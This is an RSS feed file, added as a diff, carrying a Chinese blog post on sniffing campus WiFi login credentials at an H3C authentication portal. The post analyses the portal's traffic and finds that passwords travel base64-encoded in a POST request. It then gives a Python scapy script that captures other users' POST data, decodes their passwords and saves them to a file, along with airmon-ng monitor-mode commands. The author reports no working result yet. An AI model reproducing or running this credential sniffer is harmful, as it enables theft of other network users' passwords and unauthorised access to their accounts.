@@ -1,0 +1,142 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>wifi | HumblePoster</title>
+    <link>https://p0st3r.github.io/tags/wifi/</link>
+      <atom:link href="https://p0st3r.github.io/tags/wifi/index.xml" rel="self" type="application/rss+xml" />
+    <description>wifi</description>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>2016</copyright><lastBuildDate>Tue, 09 May 2017 00:00:00 +0000</lastBuildDate>
+    <image>
+      <url>https://p0st3r.github.io/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_2.png</url>
+      <title>wifi</title>
+      <link>https://p0st3r.github.io/tags/wifi/</link>
+    </image>
+    
+    <item>
+      <title>H3C校园网WIFI密码嗅探</title>
+      <link>https://p0st3r.github.io/post/h3c-wifi-sniff/</link>
+      <pubDate>Tue, 09 May 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/h3c-wifi-sniff/</guid>
+      <description>&lt;h1 id=&#34;初步分析认证交互&#34;&gt;初步分析认证交互&lt;/h1&gt;
+&lt;p&gt;该校校园网WIFI采用H3C认证，认证地址为内网某服务器上。url为
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//192.168.150.2%3A8080/portal/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://192.168.xxx.x:xxxx/portal/index_default.jsp&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;查看dom&#34;&gt;查看DOM&lt;/h2&gt;
+&lt;p&gt;发现了几个重要的函数。base64()、checkUserName()、encrypt()&lt;/p&gt;
+&lt;p&gt;base64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。&lt;/p&gt;
+&lt;p&gt;base64是将输入的文本进行一次base64编码，checkUerName就是检查用户名，encrypt是将密码再进行一次加密。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-eec5275988a740dd98ee624e443ab1a8_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;分析网络流&#34;&gt;分析网络流&lt;/h2&gt;
+&lt;p&gt;首先使用火狐的firebug+检查元素来分析网络流。&lt;/p&gt;
+&lt;p&gt;当我们访问登陆页面时，发送GET请求并带一个i_p_pl的cookie&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-bf33b3c1543ec099f360573a6ac00aaf_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;尝试登陆，登陆成功跳转到
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//192.168.xxx.x%3Axxxx/portal/succese.jsp&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://192.168.xxx.x:xxxx/portal/page/loginSucc.jsp**&lt;/a&gt;，发送了*个GET请求，除去图片和脚本，此次登陆只向/portal/loginSucc.jsp发送了GET包，除了i_p_pl，还带有hello1、hello2两个个cookie，其中hello1为登陆发送的username，hello2暂不明其含义。&lt;/p&gt;
+&lt;p&gt;在后来的测试中，发现hello2是【记住登陆】功能的参数，当hello2=false时不记住，hello2=true时记住并附带hello3、hello4、hello5参数，本来应当是可以利用这些cookie来绕过登陆直接请求认证的，不过考虑到其又要增加工作量，因此先放一边。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-279ce765f1d931475fb7997c43b8a7bf_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这就很奇怪了，在整个登陆过程全部都是GET请求而没有POST请求，没有POST请求是怎么把用户名密码传输上去认证的呢？况且之前已经在DOM中发现了base64encode()和query()函数。难道用户名和密码是在GET时Cookie中传上去的？。虽然不用想就知道GET发送cookie来登陆很扯，但还是要研究一下cookie的含义。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-bcc5e9f15b77dec561a603ca8f063bc2_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;探究cookie含义&#34;&gt;探究cookie含义&lt;/h2&gt;
+&lt;p&gt;登陆时发送的i_p_pl&lt;/p&gt;
+&lt;p&gt;i_p_pl=JTdCJTIyZXJyb3JOdW1iZXIlMjIlM0ElMjIxJTIyJTJDJTIybmV4dFVybCUyMiUzQSUyMmh0dHAlM0ElMkYlMkYxOTIuMTY4LjE1MC4yJTNBODA4MCUyRnBvcnRhbCUyRmluZGV4X2RlZmF1bHQuanNwJTIyJTJDJTIycXVpY2tBdXRoJTIyJTNBZmFsc2UlMkMlMjJjbGllbnRMYW5ndWFnZSUyMiUzQSUyMkNoaW5lc2UlMjIlMkMlMjJhc3NpZ25JcFR5cGUlMjIlM0EwJTJDJTIyaU5vZGVQd2ROZWVkRW5jcnlwdCUyMiUzQTElMkMlMjJ3bGFubmFzaWQlMjIlM0ElMjIlMjIlMkMlMjJ3bGFuc3NpZCUyMiUzQSUyMiUyMiUyQyUyMm5hc0lwJTIyJTNBJTIyJTIyJTJDJTIyYnlvZFNlcnZlcklwJTIyJTNBJTIyMC4wLjAuMCUyMiUyQyUyMmJ5b2RTZXJ2ZXJJcHY2JTIyJTNBJTIyMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlM0EwMDAwJTNBMDAwMCUzQTAwMDAlMjIlMkMlMjJieW9kU2VydmVySHR0cFBvcnQlMjIlM0ElMjI4MDgwJTIyJTJDJTIyaWZUcnlVc2VQb3B1cFdpbmRvdyUyMiUzQWZhbHNlJTJDJTIydWFtSW5pdEN1c3RvbSUyMiUzQSUyMjElMjIlMkMlMjJjdXN0b21DZmclMjIlM0ElMjJNUSUyMiUyQyUyMnJlZ0NvZGVUeXBlJTIyJTNBJTIyTUElMjIlN0Q&lt;/p&gt;
+&lt;p&gt;很明显这是一个base64编码过的字符串，把这个base64解码再url解码，就得到了&lt;/p&gt;
+&lt;p&gt;{“errorNumber”:”1”,”nextUrl”:”
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//192.168.150.2%3A8080/portal/index_default.jsp&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://192.168.xxx.x:xxxx/portal/index_default.jsp**&lt;/a&gt;“,”quickAuth”:false,”clientLanguage”:”Chinese”,”assignIpType”:0,”iNodePwdNeedEncrypt”:1,”wlannasid”:””,”wlanssid”:””,”nasIp”:””,”byodServerIp”:”0.0.0.0”,”byodServerIpv6”:”0000:0000:0000:0000:0000:0000:0000:0000”,”byodServerHttpPort”:”8080”,”ifTryUsePopupWindow”:false,”uamInitCustom”:”1”,”customCfg”:”MQ”,”regCodeType”:”MA”}&lt;/p&gt;
+&lt;p&gt;这只是向无线路由器发送的表明自己身份的未完成的表单，没有我们要的用户名和密码。&lt;/p&gt;
+&lt;h1 id=&#34;完整认证过程&#34;&gt;完整认证过程&lt;/h1&gt;
+&lt;p&gt;只有GET请求果然很扯，这很有可能是我们的浏览器网络流分析工具有些问题，或者该Web认证的安全性足够好，导致我们无法截取完整的请求流。&lt;/p&gt;
+&lt;p&gt;这样就只有用Wireshark来对网卡进行完全的监听，以抓取全部流量包。&lt;/p&gt;
+&lt;p&gt;设置Capture interface为 WLAN 无线网卡，开启抓取后重现登陆过程。&lt;/p&gt;
+&lt;p&gt;抓到的流量包除了访问该认证网站的http流，还包括了所有经过该无线网卡的所有协议的网络流。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-6cd8906aa2f5a6d610aefc4c269c322f_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置过滤规则为http协议并且只有该认证网址ip。&lt;/p&gt;
+&lt;p&gt;发现登录一次h3c系统，要先后传参给3个页面，一个/pws？t=li，一个/afterlogin.jsp,一个/loginSucc.jsp，所以就分别看这几个网页的抓包数据。&lt;/p&gt;
+&lt;p&gt;发现其cookie都是一样的，但是只有pws这个页面是POST请求。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-1d86af749bc5c0d02e757e52e08d791f_hd.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看pws应用层传输的数据，发现上传了【userName】和【userPwd】参数，也就是说，只有这个页面是验证密码的。&lt;/p&gt;
+&lt;p&gt;【userName】就是登陆的用户名，【userPwd】是经过base64编码后的密码。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;./v2-630128ad034d028c51c867078cbc1530_hd.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;总结思路&#34;&gt;总结思路&lt;/h1&gt;
+&lt;p&gt;我们可以抓取用户登陆时的POST请求来获取用户名和密码，也可以在用户勾选【记住密码】时获取带有用户名密码信息的cookie。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;当抓到client ==&amp;gt; server的数据包时&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;如果是GET请求，检查有没有Cookie存在。&lt;/li&gt;
+&lt;li&gt;如果是POST请求，把用户名和密码拿出来。&lt;/li&gt;
+&lt;li&gt;检查是否有set-cookie头部，有的话取出来。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;最后如果有cookie被嗅探到，就带着cookie把向server索要一下密码。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;但是为了偷懒，这里就不嗅探cookie了，直接嗅探POST的用户名和密码就行了。最终思路如下：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当抓到client ==&amp;gt; server的数据包时，如果是POST请求，直接把用户名和密码拿出来。&lt;/p&gt;
+&lt;h1 id=&#34;嗅探&#34;&gt;嗅探&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;实验环境&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ubuntu虚拟机&lt;/li&gt;
+&lt;li&gt;大功率USB无线网卡（8187等）&lt;/li&gt;
+&lt;li&gt;python2.7&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;python扩展库需要&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;requests&lt;/li&gt;
+&lt;li&gt;scapy&lt;/li&gt;
+&lt;li&gt;scapy_http&lt;/li&gt;
+&lt;li&gt;lxml&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;** 代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scapy_http.http &lt;span style=&#34;color:#f92672&#34;&gt;as&lt;/span&gt; http
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; lxml &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; etree
+iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wlan0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;http://192.168.xxx.x:xxxx/portal/pws?t=li&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/root&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prn&lt;/span&gt;(pkt):
+    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
+    &lt;span style=&#34;color:#75715e&#34;&gt;#std ==&amp;gt; ap    &lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;haslayer(http&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;HTTPRequest):
+        &lt;span style=&#34;color:#75715e&#34;&gt;#if post the username and password&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Method &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;POST&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load:            
+            dt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]:i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pkt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)}        
+            data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:::&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join((dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;],dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userPwd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;base64&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;        
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+]Get! Post data:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;(dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userName&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;],dt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;userPwd&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])    
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; data &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; None:
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(path &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;schoolUserPwd.txt&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; txt:    
+                    txt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(data)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:        
+        sniff(iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;iface, prn&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;prn, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ip host 192.168.xxx.x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, store&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)    
+        &lt;span style=&#34;color:#75715e&#34;&gt;#sniff(offline=path + &amp;#34;school.pcap&amp;#34;, prn=prn, filter=&amp;#34;ip host 192.168.xxx.x&amp;#34;)    &lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;, e:        
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;quitting...&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;__main__&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;:    
+    main()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;requests用来向服务器请求&lt;/li&gt;
+&lt;li&gt;scapy用来在无线网络中嗅探&lt;/li&gt;
+&lt;li&gt;scapy_http用来对http协议更方便的解析&lt;/li&gt;
+&lt;li&gt;lxml用来从服务器返回的html文件中，解析出来用户名和密码&lt;/li&gt;
+&lt;li&gt;prn是sniff函数每过滤到一个符合条件的数据包时回调的函数，并将数据包本身作为参数传入&lt;/li&gt;
+&lt;li&gt;之所以选择Ubuntu而不是Windows是因为scapy_http在win下运行有些问题&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;由于我们既要嗅探，同时又要向服务器请求，所以airmon-ng check kill后，无线网卡开启monitor模式，再将网卡调到信号最强的ap的信道上。之前经过kismet抓取无线网包发现该校园网WIFI是在channel 1/6/11信道上工作的。&lt;/p&gt;
+&lt;p&gt;最后再打开网络管理的服务。&lt;/p&gt;
+&lt;p&gt;执行以下命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$sudo airmon-ng check kill
+$sudo ifconfig wlan0 down
+$sudo iwconfig wlan0 mode monitor
+$sudo ifconfig wlan0 up
+$sudo iwconfig mon0 channel 1/6/11
+$sudo service network-manager start
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;由于之前买的无线网卡是劣质品无法识别，因此暂无结果。&lt;/p&gt;
+&lt;p&gt;理论上是可以嗅探到的，等成功嗅探后再补发。&lt;/p&gt;
+&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
+&lt;p&gt;参考Freebuf的
+&lt;a href=&#34;http://link.zhihu.com/?target=http%3A//www.freebuf.com/articles/network/129721.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;如何在开放无线网络中嗅探校园网密码**&lt;/a&gt;这篇文章提供的python脚本，针对该校的网络进行了一些修改。&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
